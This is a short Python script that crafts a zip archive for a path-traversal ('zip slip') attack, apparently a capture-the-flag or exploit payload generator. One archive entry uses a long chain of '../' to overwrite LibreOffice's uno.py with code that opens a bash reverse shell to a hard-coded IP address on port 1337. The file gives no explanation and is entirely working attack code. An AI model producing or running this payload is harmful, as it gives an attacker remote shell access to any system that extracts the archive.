import zipfile

if __name__ == "__main__":
    try:
        binary1 = b'1ue'
        binary2 = b'import os\r\nos.system(\'bash -i >& /dev/tcp/103.251.89.204/1337 0>&1\')'
        zipFile = zipfile.ZipFile("666.zip", "a", zipfile.ZIP_DEFLATED)
        info = zipfile.ZipInfo("666.zip")
        zipFile.writestr("test", binary1)
        zipFile.writestr("../../../../../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py", binary2)
        zipFile.close()
    except IOError as e:
        raise e